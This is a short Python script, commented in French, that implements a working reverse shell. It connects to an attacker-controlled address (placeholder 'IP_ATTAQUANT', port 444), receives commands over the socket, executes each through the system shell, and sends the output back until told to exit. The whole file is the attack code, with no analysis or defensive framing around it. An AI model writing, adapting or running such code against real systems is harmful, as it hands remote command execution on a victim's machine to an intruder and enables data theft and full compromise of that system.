import socket
import subprocess
import os

def reverse_shell():
    # Adresse IP de la machine attaquante et port sur lequel elle écoute
    SERVER_IP = 'IP_ATTAQUANT'
    SERVER_PORT = 444

    try:
        # Connexion au serveur de l'attaquant
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))

        # Tant que la connexion est établie
        while True:
            # Recevoir la commande à exécuter
            command = s.recv(1024).decode()

            if command.lower() == "exit":
                # Fermer la connexion si "exit" est reçu
                break

            # Exécuter la commande dans le shell
            if command:
                output = subprocess.getoutput(command)
                s.send(output.encode())  # Envoyer le résultat de la commande à l'attaquant

        s.close()

    except Exception as e:
        print(f"Erreur dans la connexion: {e}")

if __name__ == "__main__":
    reverse_shell()
